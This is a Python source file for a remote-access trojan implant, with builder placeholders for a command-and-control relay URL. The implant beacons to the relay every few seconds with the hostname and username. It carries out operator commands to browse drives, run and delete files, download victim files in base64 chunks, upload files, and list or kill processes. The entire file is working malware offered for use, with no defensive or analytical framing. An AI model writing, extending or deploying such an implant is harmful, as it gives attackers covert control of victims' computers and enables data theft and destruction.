# payload_template.py (Upgraded with Rename function)
import requests, time, threading, subprocess, uuid, os, platform, socket, shutil, base64, getpass, psutil

# --- Configuration (to be replaced by builder) ---
RELAY_URL = "{{RELAY_URL}}"
C2_USER = "{{C2_USER}}"
SESSION_ID = str(uuid.uuid4())
CHUNK_SIZE = 1024 * 512

def execute_command(command_data):
    action = command_data.get('action')
    params = command_data.get('params', {})
    response_id = command_data.get('response_id')
    result = {"status": "error", "data": "Unsupported action"}
    
    try:
        if action == 'list_drives':
            import string
            drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
            result = {"status": "success", "data": drives}
        elif action == 'list_directory':
            path = params.get('path', 'C:\\')
            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                try:
                    is_dir = os.path.isdir(full_path)
                    size = os.path.getsize(full_path) if not is_dir else 0
                    items.append({"name": item, "type": "folder" if is_dir else "file", "size": size})
                except OSError: continue
            result = {"status": "success", "data": {"path": path, "items": items}}
        elif action == 'execute_file':
            if hasattr(os, 'startfile'): os.startfile(params.get('path'))
            else: subprocess.call(['open', params.get('path')])
            result = {"status": "success", "data": f"Executed: {os.path.basename(params.get('path'))}"}
        elif action == 'delete_file':
            path = params.get('path')
            if os.path.isdir(path): shutil.rmtree(path)
            else: os.remove(path)
            result = {"status": "success", "data": f"Deleted: {path}"}
        elif action == 'new_folder':
            path = params.get('path'); os.makedirs(path, exist_ok=True)
            result = {"status": "success", "data": f"Created folder: {path}"}
        # --- NEW: Rename Logic for the implant ---
        elif action == 'rename_path':
            os.rename(params.get('old_path'), params.get('new_path'))
            result = {"status": "success", "data": f"Renamed to {os.path.basename(params.get('new_path'))}"}
        elif action == 'download_chunk':
            path = params.get('path'); chunk_num = params.get('chunk_num', 0)
            with open(path, 'rb') as f:
                f.seek(chunk_num * CHUNK_SIZE)
                chunk_data = f.read(CHUNK_SIZE)
                is_last = len(chunk_data) < CHUNK_SIZE
                result = {"status": "success", "data": {"chunk": base64.b64encode(chunk_data).decode(), "is_last": is_last, "chunk_num": chunk_num}}
        elif action == 'upload_chunk':
            path = params.get('path'); chunk_data = params.get('chunk'); is_first = params.get('is_first')
            if is_first and os.path.exists(path): os.remove(path)
            with open(path, 'ab') as f: f.write(base64.b64decode(chunk_data))
            result = {"status": "success"}
        elif action == 'list_processes':
            processes = []
            for p in psutil.process_iter(['pid', 'name', 'username', 'memory_info']):
                try: 
                    pinfo = p.info
                    pinfo['memory_mb'] = pinfo['memory_info'].rss / (1024*1024) if pinfo.get('memory_info') else 0
                    processes.append(pinfo)
                except (psutil.NoSuchProcess, psutil.AccessDenied): pass
            result = {"status": "success", "data": sorted(processes, key=lambda p: p['name'].lower())}
        elif action == 'kill_process':
            pid = params.get('pid'); psutil.Process(pid).kill(); result = {"status": "success", "data": f"Process {pid} killed."}
    except Exception as e:
        result = {"status": "error", "data": str(e)}

    try:
        requests.post(f"{RELAY_URL}/implant/response", json={"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}, timeout=10)
    except requests.exceptions.RequestException: pass

def command_and_control_loop():
    while True:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "hostname": platform.node(), "user": getpass.getuser()}
            response = requests.post(f"{RELAY_URL}/implant/hello", json=payload, timeout=10)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.exceptions.RequestException: pass
        time.sleep(5)

if __name__ == "__main__":
    c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
    c2_thread.start()
    while True: time.sleep(60)